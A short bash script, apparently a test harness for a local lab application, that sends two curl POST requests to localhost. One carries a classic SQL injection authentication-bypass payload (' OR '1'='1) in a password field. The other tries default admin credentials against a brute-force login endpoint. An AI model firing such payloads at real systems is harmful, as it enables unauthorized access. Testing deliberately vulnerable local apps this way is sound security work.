#! /bin/bash

curl -X POST -d "name=Mark&password=%27+OR+%271%27%3D%271" http://localhost:8080/sqlijc

curl -X POST -d "name=admin&password=password" http://localhost:8080/brutalforce/login
